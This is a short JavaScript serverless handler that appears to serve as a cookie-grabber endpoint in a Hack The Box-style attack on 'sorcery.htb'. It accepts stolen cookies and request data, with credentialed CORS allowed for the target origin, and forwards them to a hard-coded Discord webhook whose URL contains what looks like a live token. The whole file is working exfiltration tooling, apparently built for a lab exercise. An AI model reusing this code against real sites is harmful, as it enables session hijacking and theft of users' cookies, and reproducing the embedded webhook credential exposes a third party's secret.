import axios from 'axios';

export default async function handler(req, res) {
  const { cookies, ...data } = req.body;

  const allowedOrigins = [
  'https://sorcery.htb',
];

  const origin = req.headers.origin;

  // Check if the origin is allowed
  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
  }

  // Set other CORS headers
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  
  const webhookUrl = 'https://discord.com/api/webhooks/1385522267672547398/fT4Ij5-fiPQGyrITXWLHfweSdhJnaOFFoAygwOCjnorfjijWLoiAnYm6DCfBCFEOnJim';

  try {
    await axios.post(webhookUrl, {
      content: 'New request received',
      embeds: [{
        title: 'Request Data',
        description: JSON.stringify(data, null, 2),
        color: 0x3498db,
      }, {
        title: 'Cookies',
        description: JSON.stringify(cookies, null, 2),
        color: 0x3498db,
      }]
    });

    res.status(200).json({ message: 'Webhook called successfully' });
  } catch (error) {
    console.error('Error calling Discord webhook:', error);
    res.status(500).json({ error: 'Error calling webhook' });
  }
}
